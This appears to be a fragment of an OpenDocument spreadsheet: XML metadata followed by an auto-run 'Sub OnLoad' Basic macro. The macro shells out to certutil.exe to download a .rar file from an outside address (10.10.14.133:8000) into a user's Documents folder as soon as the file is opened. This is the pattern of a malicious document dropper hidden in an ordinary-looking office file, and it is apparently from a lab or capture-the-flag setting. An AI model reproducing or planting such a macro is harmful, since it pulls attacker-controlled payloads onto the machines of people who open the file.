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nn3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2019-12-14T16:31:19.325000000</dc:date>
    <meta:editing-duration>PT49M11S</meta:editing-duration>
    <meta:editing-cycles>30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

	Sub OnLoad
	 Shell("certutil.exe -urlcache -split -f 'http://10.10.14.133:8000/A9E7BE51A530B77DF55E499FDFBE12CB.rar' C:\Users\luke\Documents\ods\A9E7BE51A530B77DF55E499FDFBE12CB.rar")
	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